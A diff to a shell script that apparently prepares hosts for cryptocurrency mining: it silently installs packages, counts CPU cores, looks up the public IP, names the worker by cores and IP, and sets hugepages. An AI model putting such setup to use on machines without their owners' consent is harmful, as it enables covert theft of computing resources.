@@ -11,17 +11,19 @@ RandString() {
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
 sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1
 
-core0=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
-[ -n "$core0" ] || core0=1
-core1=`grep 'processor' /proc/cpuinfo 2>/dev/null |wc -l`
-[ -n "$core1" ] || core1=1
-[ "$core0" -le "$core1" ] && cores="$core0" || cores="$core1"
+cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
 addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
 rand=`RandString 2`
 # rand=`date +"%Y%m%d%H%M%S"`
 [ -n "$rand" ] && rand="_${rand}" || rand=""
+
+if [ "$mode" == "1" ]; then
+  [ "$cores" == "2" ] && cores="1";
+  [ "$cores" == "8" ] && cores="4";
+fi
+
 name="c${cores}_${addr}${rand}"
 
 sudo sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1
